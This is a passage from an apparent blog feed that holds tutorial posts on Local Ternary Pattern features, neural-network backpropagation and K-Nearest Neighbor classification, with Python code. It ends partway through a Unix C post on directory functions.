<pre><code>G0=42 &gt; Gc=30 and G0 &gt; 35, then LTP(0, 0) = 1
G1=55 &gt; Gc=30 and G1 &gt; 35, then LTP(0, 1) = 1
...
G4=18 &lt; Gc=30 and G4 &lt; 25, then LTP(2, 2) = -1
</code></pre><p>Then we may define the approach into math formula:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-6.png" alt="Formula 6: LTP generater function"></p>
<p>where gc is center pixel, gi is current pixel, range from 0 to 8, t is threshold. Then st() can be define like Formula 7:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-7.png" alt="Formula 7: LTP st( ) function"></p>
<p><hr><br></p>
<h2 id="3-Local-Phase-Quantization-LPQ"><a href="#3-Local-Phase-Quantization-LPQ" class="headerlink" title="3.Local Phase Quantization(LPQ)"></a>3.Local Phase Quantization(LPQ)</h2><p><hr><br></p>
<h1 id="Digit-Analysis"><a href="#Digit-Analysis" class="headerlink" title="Digit Analysis"></a>Digit Analysis</h1><p>K-Nearest Neighbor guide: <a href="http://homeway.me/2017/04/21/machine-learning-knn/">http://homeway.me/2017/04/21/machine-learning-knn/</a></p>
<p>In this section, we use K-Nearest Neighbor(KNN) for digit analysis.</p>
<p><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-05-04-pattern-writter-identify"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-05-04-pattern-writter-identify" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/05/04/pattern-writter-identify/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/05/04/pattern-writter-identify/">http://homeway.me/2017/05/04/pattern-writter-identify/</a></h4><p>-by grasses</p>
<p>2017-05-05 03:22:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Machine Learning - Artificial Neural Network]]></title>
      <url>http://homeway.me/2017/04/30/machine-learning-ann/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/machine-learning-logox.png" alt="Machine Learning"></p>
<a id="more"></a>
<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>Artifical Neural Network(ANN) which is inspired by human brain neural, provide a general, practical method for learning real-valued, discrete-valued, and vector-valued functions from examples. Artifical Neural Network algorithm such as Backpropagation use gradient descent to tune network parameters to best fit a training set of input-outputpairs.</p>
<p><hr><br></p>
<h1 id="How-to-work"><a href="#How-to-work" class="headerlink" title="How to work"></a>How to work</h1><h2 id="1-Neuron"><a href="#1-Neuron" class="headerlink" title="1.Neuron"></a>1.Neuron</h2><p><img src="https://static.blog.homeway.me/blog/2017-04-30-neuron.png" alt="Figue 1: Artificial Neural Network (picture from 《机器学习-周志华》)"></p>
<p>The basic component of an ANN network is node unit called neuron. These neurons connect with pre-neurons with bridges in different weights. Every neuron receive signal from bridges and evaluated by activation function to output. In ideal situation, activation function is like figue 2, input value from pre-neuron and return 0 or 1:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-sgn-function.png" alt="Figue 2: Output in ideal situation"></p>
<p>Besides the logistic function, sigmoid functions include the ordinary arctangent, the hyperbolic tangent, the Gudermannian function, and the error function, but also the generalised logistic function and algebraic functions(Figue 3):</p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-squashing-function.png" alt="Figue 3: Some sigmoid functions: In the drawing all functions are normalized in such a way &lt;br&gt;that their slope at the origin is like figue 2.(picture from wikipedia)"></p>
<h2 id="2-Multilayer-perceptron"><a href="#2-Multilayer-perceptron" class="headerlink" title="2.Multilayer perceptron"></a>2.Multilayer perceptron</h2><p>An ANN network consists at least a input, output layer and hidden layer in which consists multilayer perceptron(MLP), which is a feedforward artificial neural network model that maps sets of input data onto a set of appropriate outputs. </p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-neural-networks-working.png" alt="Figue 4: Multilayer perceptron module"></p>
<p>A single perceptron can be used to represent many boolean functions(such as AND/OR/NOT). For example:</p>
<blockquote>
<p>AND (X1 ^ X2): Suppose w1 = w2 = 1, θ = 2, X0(bias) = 0, and y = f(1 · X1 + 1 · X2 - 2), then only when X1 = X2 = 1, y = 1<br>OR (X1 v X2): Suppose w1 = w2 = 1, θ = 0.5, X0(bias) = 0, and y = f(1 · X1 + 1 · X2 - 0.5), then only when X1 = 1 or X2 = 1, y = 1<br>NOT (!X1): Suppose w1 = 1, w2 = 0, θ = -0.5, X0(bias) = 0, and y = f(1 · X1 + 0 · X2 + 0.5), when X1 =  1, y = 0; X1 = 0, y = 1</p>
</blockquote>
<p>Unfortunately, however, some boolean func- tions cannot be represented by a single perceptron, such as the XOR function whose value is 1 if and only if x1 ≠ x2. Note the set of linearly nonseparable training examples shown in figure 5 corresponds to this XOR function:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-multilayer-perceptron.png" alt="Figue 5: AND/OR/XOR/NOT boolearn function(picture from 《机器学习-周志华》)"></p>
<p>The ability of perceptrons to represent AND, OR, AND, and NOR is important because every boolean function can be represented by some network of interconnected units based on these primitives. In fact, every boolean function can be represented by some network of perceptrons only two levels deep, in which the inputs are fed to multiple units, and the outputs of these units are then input to a second, final stage. One way is to represent the boolean function in disjunctive normal form (i.e., as the disjunction (OR) of a set of conjunctions (ANDs) of the inputs and their negations). Note that the input to an AND perceptron can be negated simply by changing the sign of the corresponding input weight.</p>
<h2 id="3-Gradient-descent"><a href="#3-Gradient-descent" class="headerlink" title="3.Gradient descent"></a>3.Gradient descent</h2><p>Gradient descent is a first-order iterative optimization algorithm. To find a local minimum of a function using gradient descent, one takes steps proportional to the negative of the gradient (or of the approximate gradient) of the function at the current point. (From: <a href="https://en.wikipedia.org/wiki/Gradient_descent#Description" target="_blank" rel="external">https://en.wikipedia.org/wiki/Gradient_descent#Description</a>).</p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-global-minimum-local-minimum.png" alt="Figue 6: global minimum and local minmum (picture from 《机器学习-周志华》)"></p>
<p>To sum, we may use gradient descent to approach the minimum for a formula. And from gradient descent we may get local minimum and global minimum, but how could we check whether the data I caculate is global minimum but local minimum?(<a href="http://stackoverflow.com/questions/9163801/gradient-descent-implementation" target="_blank" rel="external">http://stackoverflow.com/questions/9163801/gradient-descent-implementation</a>)</p>
<ul>
<li>Add noise. This reduces the precision of the parameters you’ve found, which can “blur” out local minima. The search can then jump out of local minima that are small compared to the noise, while still being trapped in deeper minima. A well-known approach for adding noise is simulated annealing.</li>
<li>Add momentum. Along with using the current gradient to define the step, also continue in the same direction as the previous step. If you take a fraction of the previous step as the momentum term, there is a tendency to keep going, which can take the search past the local minimum. By using a fraction, the steps decay exponentially, so poor steps aren’t a big problem. This was always a popular modification to gradient descent when used to train neural networks, where gradient descent is known as backpropagation.</li>
<li>Use a hybrid search. First use a global search (e.g., genetic algorithms, various Monte Carlo methods) to find some good starting points, then apply gradient descent to take advantage of the gradient information in the function.</li>
</ul>
<h2 id="4-BackPropagation"><a href="#4-BackPropagation" class="headerlink" title="4.BackPropagation"></a>4.BackPropagation</h2><p>The backward propagation of errors, or backpropagation, is a common method of training artificial neural networks and used in conjunction with an optimization method such as gradient descent. <a href="https://en.wikipedia.org/wiki/Backpropagation" target="_blank" rel="external">Backpropagatio wiki: https://en.wikipedia.org/wiki/Backpropagation</a></p>
<p>The BackPropagation follows two steps: </p>
<ul>
<li><p>step 1: Propagation</p>
<ul>
<li>Forward propagation of a training pattern’s input through the neural network in order to generate the propagation’s output activations.</li>
<li>Backward propagation of the propagation’s output activations through the neural network using the training pattern target in order to generate the deltas of all output and hidden neurons.</li>
</ul>
</li>
<li><p>step 2: Weight update</p>
<ul>
<li>Multiply its output delta and input activation to get the gradient of the weight.</li>
<li>Subtract a ratio (percentage) of the gradient from the weight.     </li>
</ul>
</li>
</ul>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-basic-neural-network-unit-neuron.png" alt="Figue 7: BackPropagation alogrithm"></p>
<p>Step one is caculate nodes output by giving weight, bias, squashing function, then get output node value; Step two needs to correcte predict value and target value, then return an error check value, which using gradient descent algorithm to feed-forward the weights.</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-1.png" alt="Formula 1: Neuron node sum"></p>
<p>Let`s return to the case of a single neuron N with weights W = (w0, … , wn) and an input X = (x1, x2 … xn), as is shown at Formula 1. And momentarily, let us add the activation function from Figue 3. </p>
<p>Supposing we predict output value as Yj, and f(x) as sigmoid function, the output may be this:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-3.png" alt="Formula 2: Neuron node predict value"></p>
<p>where θ is the bias of node, and as return of Formula 1 for simple. Now after processing, we may get all output values, so it is easy to get prediction square error:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-4.png" alt="Formula 3: Neuron prediction square error"></p>
<p>For convenience we add a factor of 1/2 to real E and drop the subscript N from f(N). Since minimizing E is the same as minimizing 0.5 * E, this changes nothing about the minima of the function. </p>
<p>Note that E is never negative, and so it will have a global minimum value at or near 0 (if it is possible for the neuron to represent the target function perfectly, it will be zero). That is, our update rule should be:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-5.png" alt="Formula 4: weight update rule"></p>
<p>where η is some fixed parameter between 0 and 1 that represent the “learning rate.”, δE is prediction square error. We will not mention η too much except to say that as long as it is sufficiently small and we allow ourselves enough time to learn, we are guaranteed to get a good approximation of some local minimum (though it might not be a global one).</p>
<p>And further, consider BackPropagation algotithm is base on <a href="http://homeway.me/2017/04/30/machine-learning-ann/#Gradient descent">Gradient descent</a>, we need seeking guidance for E:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-6.png" alt="Formula 5: seeking guidance for E"></p>
<p>Due to the continuity of the neural network, we can split the Formula 5 for:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-7.png" alt="Formula 6: split the appeal formula"></p>
<p>Here, we found sigmoid f(x) = 1 / (1 + np.exp(-x)), has a good attribute, which can be described:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-8.png" alt="Formula 7: sigmoid function&#39;s useful attribute"></p>
<p>Finally, we may base on Formula 5/6/7, return a new formula:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-9.png" alt="Formula 8: combine formula 5/6/7"></p>
<p>And now we can get the new weight formula:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/2017-04-30-ann-formula-10.png" alt="Formula 9: new weight formula"></p>
<h2 id="5-Cross-Validation"><a href="#5-Cross-Validation" class="headerlink" title="5.Cross Validation"></a>5.Cross Validation</h2><p>www.cs.cmu.edu’s slider “Overfitting, Cross-Validation”: <a href="http://www.cs.cmu.edu/~guestrin/Class/10701-S05/slides/NNet-CrossValidation-2-2-2005.pdf" target="_blank" rel="external">http://www.cs.cmu.edu/~guestrin/Class/10701-S05/slides/NNet-CrossValidation-2-2-2005.pdf</a></p>
<p>Cross-validation, sometimes called rotation estimation, is a model validation technique for assessing how the results of a statistical analysis will generalize to an independent data set, which can easily described by Figue 8:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-04-30-ann-cross-validation.jpg" alt="Figue 8: Cross Validation"></p>
<p>For Figue 8, we may choose different groups data and finally caculate their average, more information is avaiable in wikipedia: <a href="https://en.wikipedia.org/wiki/Cross-validation" target="_blank" rel="external">https://en.wikipedia.org/wiki/Cross-validation</a> </p>
<p><hr><br></p>
<h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1><p>Github code: <a href="https://github.com/grasses/Machine-Learning/blob/master/dl/NeuralNetworks/nn.py" target="_blank" rel="external">https://github.com/grasses/Machine-Learning/blob/master/dl/NeuralNetworks/nn.py</a></p>
<pre><code>import numpy as np

class NeuralNetwork(object):
    &#39;&#39;&#39;
    :param layers: A list containing the number of units in each layer. Should be at least two values.
    :param activation: The activation function to be used. Can be &quot;logistic&quot; or &quot;tanh&quot;.
    &#39;&#39;&#39;
    def __init__(self, layers, activation = &#39;tanh&#39;):
        if activation == &#39;logistic&#39;:
            self.activation = self.logistic
            self.activation_deriv = self.logistic_derivative
        elif activation == &#39;tanh&#39;:
            self.activation = self.tanh
            self.activation_deriv = self.tanh_deriv
        &#39;&#39;&#39;
        generate weight matrix with random float
        &#39;&#39;&#39;
        self.weights = []
        for i in range(1, len(layers) - 1):
            self.weights.append((2 * np.random.random((layers[i - 1] + 1, layers[i] + 1)) - 1) * 0.25)
            self.weights.append((2 * np.random.random((layers[i] + 1, layers[i + 1])) - 1) * 0.25)

    @staticmethod
    def tanh(x):
        return np.tanh(x)

    @staticmethod
    def tanh_deriv(x):
        return 1.0 - np.tanh(x) * np.tanh(x)

    @staticmethod
    def logistic(x):
        return 1 / (1 + np.exp(-x))

    @staticmethod
    def logistic_derivative(x):
        return NeuralNetwork.logistic(x) * (1 - NeuralNetwork.logistic(x))

    &#39;&#39;&#39;
    :param X        numpy.array     train matrix
    :param y        numpy.array     result label
    :param learning_rate    float
    :param epochs   int             backprobagation times
    &#39;&#39;&#39;
    def fit(self, X, y, learning_rate = 0.2, epochs = 10000):
        X = np.atleast_2d(X)
        temp = np.ones([X.shape[0], X.shape[1] + 1])
        temp[:, 0:-1] = X
        X = temp
        y = np.array(y)

        &#39;&#39;&#39;
        loop operation for epochs times
        &#39;&#39;&#39;
        for k in range(epochs):
            # select a random line from X for training
            i = np.random.randint(X.shape[0])
            a = [X[i]]

            # going forward network, for each layer
            for l in range(len(self.weights)):
                # computer the node value for each layer (O_i) using activation function
                a.append(self.activation(np.dot(a[l], self.weights[l])))
            # computer the error at the top layer
            error = y[i] - a[-1]
            deltas = [
                error * self.activation_deriv(a[-1])]  # For output layer, Err calculation (delta is updated error)

            # start backprobagation
            for l in range(len(a) - 2, 0, -1):  # we need to begin at the second to last layer
                # compute the updated error (i,e, deltas) for each node going from top layer to input layer
                deltas.append(deltas[-1].dot(self.weights[l].T) * self.activation_deriv(a[l]))
            deltas.reverse()
            for i in range(len(self.weights)):
                layer = np.atleast_2d(a[i])
                delta = np.atleast_2d(deltas[i])
                self.weights[i] += learning_rate * layer.T.dot(delta)

    def predict(self, x):
        x = np.array(x)
        temp = np.ones(x.shape[0] + 1)
        temp[0:-1] = x
        a = temp
        for l in range(0, len(self.weights)):
            a = self.activation(np.dot(a, self.weights[l]))
        return a
</code></pre><p><hr><br></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>*《机器学习-周志华》<a href="https://www.amazon.cn/%E5%9B%BE%E4%B9%A6/dp/B01ARKEV1G/" target="_blank" rel="external">https://www.amazon.cn/图书/dp/B01ARKEV1G/</a></p>
<ul>
<li>Wikipedia Artificial Neural Network: <a href="https://en.wikipedia.org/wiki/Artificial_neural_network" target="_blank" rel="external">https://en.wikipedia.org/wiki/Artificial_neural_network</a></li>
<li>Wikipedia Gradient Descent: <a href="https://en.wikipedia.org/wiki/Gradient_descent" target="_blank" rel="external">https://en.wikipedia.org/wiki/Gradient_descent</a></li>
<li>Artificial Neural Network (ANN) - Introduction: <a href="http://www.bogotobogo.com/python/scikit-learn/Artificial-Neural-Network-ANN-1-Introduction.php" target="_blank" rel="external">http://www.bogotobogo.com</a></li>
<li>Neural Networks and the Backpropagation Algorithm:<a href="https://jeremykun.com/2012/12/09/neural-networks-and-backpropagation/" target="_blank" rel="external">https://jeremykun.com/2012/12/09/neural-networks-and-backpropagation/</a></li>
</ul>
<!--neural-networks-working.png

-blog/2017-04-30-sigmoid-function.png
-->
<p><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-04-30-machine-learning-ann"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-04-30-machine-learning-ann" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/04/30/machine-learning-ann/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/04/30/machine-learning-ann/">http://homeway.me/2017/04/30/machine-learning-ann/</a></h4><p>-by grasses</p>
<p>2017-04-30 16:52:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Machine Learning - K-Nearest Neighbor]]></title>
      <url>http://homeway.me/2017/04/21/machine-learning-knn/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/machine-learning-logox.png" alt="Machine Learning"></p>
<a id="more"></a>
<h1 id="1-About"><a href="#1-About" class="headerlink" title="1.About"></a>1.About</h1><p><a href="https://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm" target="_blank" rel="external">K-Nearest Neighbor</a> is a type of instance-based learning, or lazy learning, where the function is only approximated locally and all computation is deferred until classification.<br>The KNN algorithm is among the simplest of all machine learning algorithms.</p>
<p>The KNN classifier offers an alternative approach to classification using lazy learning that allows us to make predictions without any model training but at the cost of expensive prediction step.</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/knn_logo.png" alt="Figue 1:  Example of k-NN classification. The test sample (green circle) should be classified either to the first class of blue squares or to the second class of red triangles. If k = 3 (solid line circle) it is assigned to the second class because there are 2 triangles and only 1 square inside the inner circle. If k = 5 (dashed line circle) it is assigned to the first class (3 squares vs. 2 triangles inside the outer circle)."></p>
<p>As is show in figue 1, the KNN algorithm offers an alternative approach to classification using lazy learning.</p>
<p><hr><br></p>
<h1 id="2-How-to-work"><a href="#2-How-to-work" class="headerlink" title="2.How to work"></a>2.How to work</h1><h2 id="2-1-Simple-Step"><a href="#2-1-Simple-Step" class="headerlink" title="2.1 Simple Step"></a>2.1 Simple Step</h2><p>We think two point have the closest distance, they may have the similar attribute, and then we classify them as a class. First, we should change thoses elements into vector and then count their distance, finally we get their neighbors, classify them.</p>
<p>Suppose we have pairs samples <code>&lt;X1, Y1&gt;, &lt;X2, Y2&gt; ... &lt;Xn, Yn&gt;</code>, and we want to predict the sample <code>&lt;X, Y&gt;</code> belong to which class, we should caculate the distance bettween <code>&lt;X, Y&gt;</code> and <code>&lt;Xm, Ym&gt;</code> (m ∈ (1, n)), and find type of <code>&lt;X, Y&gt;</code> by some math approach.</p>
<p>As is described about, the KNN algorithm logic following steps:</p>
<pre><code>1.Build training model, change training samples into matrix matrix vector
2.Choose the number of k and a distance metric.
3.Caculate distances bettween &lt;X, Y&gt; and &lt;Xm, Ym&gt;, and save k nearest neighbors
4.Decided &lt;X, Y&gt; by weight vote.
</code></pre><h2 id="2-2-Distance-Algorithm"><a href="#2-2-Distance-Algorithm" class="headerlink" title="2.2 Distance Algorithm"></a>2.2 Distance Algorithm</h2><p>The Euclidean distance between points p and q is the length of the line segment connecting them.</p>
<p>In Cartesian coordinates(笛卡尔坐标), if p = (p1, p2,…, pn) and q = (q1, q2,…, qn) are two points in Euclidean n-space, then the distance (d) from p to q, or from q to p is given by the Pythagorean formula:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/euclidean-distance.jpg" alt="euclidean distance"></p>
<p>Cosine similarity is the cosine of the angle between two n-dimensional vectors in an n-dimensional space. It is the dot product of the two vectors divided by the product of the two vectors’ lengths (or magnitudes). For two vectors A and B in an n-dimensional space:</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/cosine-distance.png" alt="cosine similarity distance"></p>
<p>Cosine similarity ranges between -1 and 1, where -1 is perfectly dissimilar and 1 is perfectly similar. </p>
<p>The another algorithm is <a href="https://en.wiktionary.org/wiki/Manhattan_distance" target="_blank" rel="external">Manhattan distance</a>.The distance between two points in a grid based on a strictly horizontal and/or vertical path (that is, along the grid lines), as opposed to the diagonal or “as the crow flies” distance. The Manhattan distance is the simple sum of the horizontal and vertical components, whereas the diagonal distance might be computed by applying the Pythagorean theorem.</p>
<p><img src="http://oorkttmj2.bkt.clouddn.com/blog/ml/200px-Manhattan_distance.png" alt="Manhattan distance"></p>
<p><hr><br></p>
<h1 id="3-Coding"><a href="#3-Coding" class="headerlink" title="3.Coding"></a>3.Coding</h1><p>python sklearn documents: <a href="http://scikit-learn.org/stable/modules/neighbors.html" target="_blank" rel="external">http://scikit-learn.org/stable/modules/neighbors.html</a></p>
<p>My github example project: <a href="https://github.com/grasses/Machine-Learning/tree/master/ml/knn" target="_blank" rel="external">https://github.com/grasses/Machine-Learning/tree/master/ml/knn</a></p>
<p>Testing csv data: <a href="https://github.com/grasses/Machine-Learning/blob/master/ml/knn/knn.csv" target="_blank" rel="external">https://github.com/grasses/Machine-Learning/blob/master/ml/knn/knn.csv</a></p>
<p>That’s start with an example, we have a table with row described as <code>&lt;x1, x2, x3, x4&gt;</code>, now we want to predict <code>&lt;5.1, 3.5, 1.4, 0.2&gt;</code></p>
<h2 id="step-1-building-training-matrix"><a href="#step-1-building-training-matrix" class="headerlink" title="step 1 building training matrix"></a>step 1 building training matrix</h2><pre><code>    def train_predict(data_list = [], datalist = None, split = 0.5):
        train_list = []
        test_list = []
        # build training list &amp;&amp; testing list
        for x in range(len(data_list)):
            if random.random() &lt; split:
                test_list.append(data_list[x])
            else:
                train_list.append(data_list[x])
        for x in range(len(test_list)):
            y = test_list[x][len(test_list[x]) - 1]
            # training one by one
            test(test_list[x], y)
</code></pre><h2 id="step-2-Choose-the-number-of-k-and-a-distance-metric"><a href="#step-2-Choose-the-number-of-k-and-a-distance-metric" class="headerlink" title="step 2 Choose the number of k and a distance metric"></a>step 2 Choose the number of k and a distance metric</h2><pre><code>    &#39;&#39;&#39;
    Test() is the entrance of knn
    @input  test_X        list        [1,2,3,4]format
    @return predict     string      predict result
    &#39;&#39;&#39;
    def test(test_X = [], predict = &#39;&#39;):
        neighbors = get_neighbors(test_X)
        result = get_min_dest(neighbors)

        total_count = 0
        right_count = 0

        if str(result) == str(predict):
            right_count += 1
        total_count += 1

        # append test test_X to self.tets_list by default
        test_X.append(predict)
        test_list.append(test_X)
</code></pre><h2 id="step-3-Caculate-distances"><a href="#step-3-Caculate-distances" class="headerlink" title="step 3 Caculate distances"></a>step 3 Caculate distances</h2><pre><code>    &#39;&#39;&#39;
    Count &lt;X1, Y2&gt; -&gt; &lt;X2, Y2&gt; with euclidean distance algorithm
    &#39;&#39;&#39;
    def get_dest(source, destination):
        distance = 0
        for i in range(len(source) - 1):
            distance += pow((float(source[i]) - float(destination[i])), 2)
        return math.sqrt(distance)

   &#39;&#39;&#39;
   Get train list neighbors sorted by distance.
   &#39;&#39;&#39;
    def get_neighbors(train_list = [], test_X = [], k = 5):
        distances = []
        neighbors = []
        for x in range(len(train_list)):
            distances.append((train_list[x], get_dest(test_X, train_list[x])))
        distances.sort(key = operator.itemgetter(1))

        for i in range(k):
            neighbors.append(distances[i][0])
        return neighbors
</code></pre><h2 id="step-4-Decided-by-weight-vote"><a href="#step-4-Decided-by-weight-vote" class="headerlink" title="step 4 Decided  by weight vote"></a>step 4 Decided <x, y=""> by weight vote</x,></h2><pre><code>&#39;&#39;&#39;
    get_min_dest() return closest neighbor by vote
    @input  neighbors        list    [[], []]format
    @return neighbor        []        closest neighbor
    &#39;&#39;&#39;
    def get_min_dest(neighbors = []):
        class_votes = {}
        for x in range(len(neighbors)):
            response = neighbors[x][-1]
            if response in class_votes:
                class_votes[response] += 1
            else:
                class_votes[response] = 1
        sorted_vote = sorted(class_votes.iteritems(), key = operator.itemgetter(1), reverse=True)
        return sorted_vote[0][0]
</code></pre><h2 id="Example-Output"><a href="#Example-Output" class="headerlink" title="Example Output"></a>Example Output</h2><pre><code>===============test instance()=================
test()-&gt; knn predicted = &#39;Iris-versicolor&#39;, your given actual = &#39;Iris-versicolor&#39;
test()-&gt; knn predicted = &#39;Iris-virginica&#39;, your given actual = &#39;Iris-versicolor&#39;

===============accuracy()=================
training size = 150, testing size = 2
accuracy()-&gt; total instance = 2, right instance = 1, error instance = 1, right rate = 50.0%

===============predict()=================
predict()-&gt; instance = [7.1, 3.0, 5.9, 2.1], knn predict = Iris-virginica

===============mult_predict()=================
predict()-&gt; instance = [4.6, 3.4, 1.4, 1.3], knn predict = Iris-setosa
predict()-&gt; instance = [7.1, 3.0, 5.9, 1.1], knn predict = Iris-virginica
predict()-&gt; instance = [2.3, 3.3, 4.5, 6.7], knn predict = Iris-versicolor
</code></pre><p><hr><br></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ul>
<li><a href="https://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm" target="_blank" rel="external">Wikipedia: k-nearest neighbors algorithm</a></li>
<li><a href="https://en.wiktionary.org/wiki/Manhattan_distance" target="_blank" rel="external">Wiktionary: Manhattan distance</a></li>
<li><a href="http://www.bogotobogo.com/python/scikit-learn/scikit_machine_learning_k-NN_k-nearest-neighbors-algorithm.php" target="_blank" rel="external">SCIKIT-LEARN : K-NEAREST NEIGHBORS (K-NN) ALGORITHM</a></li>
<li><a href="http://www.pyimagesearch.com/2014/03/03/charizard-explains-describe-quantify-image-using-feature-vectors/" target="_blank" rel="external">Charizard Explains How To Describe and Quantify an Image Using Feature Vectors</a></li>
<li>‘Introduction to Machine Learning’ by Alex Smola and S.V.N. Vishwanathan</li>
</ul>
<p><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-04-21-machine-learning-knn"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-04-21-machine-learning-knn" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/04/21/machine-learning-knn/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/04/21/machine-learning-knn/">http://homeway.me/2017/04/21/machine-learning-knn/</a></h4><p>-by grasses</p>
<p>2017-04-21 23:52:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Unix C Programming - file dir]]></title>
      <url>http://homeway.me/2017/03/04/apue-file-dir/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/img/gnu.png" alt="apue"></p>
<a id="more"></a>
<!-- https://static.blog.homeway.me/blog/img/apue-unix-linux.png -->
<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01.API"></a>0x01.API</h1><h3 id="1-makir-mkdirat-rmdkir"><a href="#1-makir-mkdirat-rmdkir" class="headerlink" title="1.makir()/mkdirat()/rmdkir()"></a>1.makir()/mkdirat()/rmdkir()</h3><pre><code>#include &lt;sys/stat.h&gt;
int mkdir (const char *filename, mode_t mode)
int mkdirat (int fd, const char *filename, mode_t mode)
#include &lt;unistd.h&gt;
int rmdir(const char *filename)
                                            - 成功返回：0；失败返回：-1
</code></pre><p><code>mkdir()/mkdirat()</code> used to create directory. When df=AT_FDCWD or filemane is positive path, <code>makir()</code> is equal to <code>mkdirat()</code>.</p>
<p>Mode Bits for Access Permissionm struct <code>mode_t</code> infomation at: <a href="http://homeway.me/2017/03/03/apue-file-stat/#permision">http://homeway.me/2017/03/03/apue-file-stat/#permision</a></p>
<p>In most other respects, rmdir behaves like unlink.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#define RWRWRW (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)
int main(int argc, char** argv) {
    if (argc == 1) {
        printf(&quot;Usage: %s pathname&quot;, argv[0]);
        return 0;
    }
    char cmd[512];
    for (int i = 1; i &lt; argc; ++i) {
        if (mkdir(argv[i], (RWRWRW)) &lt; 0) {
            printf(&quot;%s: mkdir error&quot;, argv[i]);
        } else {
            printf(&quot;%s: mkdir success\n&quot;, argv[i]);
            sleep(1);
            sprintf(cmd, &quot;ls -l %s&quot;, argv[i]);
            system(cmd);
        }
    }
    for (int i = 1; i &lt; argc; ++i) {
        if (rmdir(argv[i]) &lt; 0) {
            printf(&quot;%s: rmdir error&quot;, argv[i]);
        } else {
            printf(&quot;%s: rmdir success\n&quot;, argv[i]);
            sleep(1);
            sprintf(cmd, &quot;ls -l %s&quot;, argv[i]);
            system(cmd);
        }
    }
}
</code></pre><blockquote>
<p>➜ $: gcc test.c<br>➜ $: ./a.out forkme</p>
</blockquote>
<pre><code>forkme: mkdir success
forkme: rmdir success
ls: forkme: No such file or directory
</code></pre><p><hr><br></p>
<h3 id="2-opendir-fdopendir-readdir-closedir"><a href="#2-opendir-fdopendir-readdir-closedir" class="headerlink" title="2.opendir()/fdopendir()/readdir()/closedir()"></a>2.opendir()/fdopendir()/readdir()/closedir()</h3><pre><code>#include&lt;dir.h&gt;
DIR * opendir (const char *dirname)
DIR * fdopendir (int fd)
                                            - 成功返回：DIR；失败返回：NULL
#include&lt;dirent.h&gt;
struct dirent * readdir (DIR *dirstream)
                                            - 成功返回：dirent；失败返回：NULL
int closedir (DIR *dirstream)
                                            - 成功返回：0；失败返回：-1
</code></pre><p>DIR struct represents a directory stream, and use readdir() to read directory information. DIR struct defination in my macos is like this:</p>
<pre><code>/* structure describing an open directory. */
typedef struct {
    int        __dd_fd;        /* file descriptor associated with directory */
    long    __dd_loc;        /* offset in current buffer */
    long    __dd_size;    /* amount of data returned */
    char    *__dd_buf;    /* data buffer */
    int        __dd_len;        /* size of data buffer */
    long    __dd_seek;    /* magic cookie returned */
    long    __dd_rewind;    /* magic cookie for rewinding */
    int        __dd_flags;    /* flags for readdir */
    __darwin_pthread_mutex_t __dd_lock;     /* for thread locking */
    struct _telldir *__dd_td;                 /* telldir position recording */
} DIR;
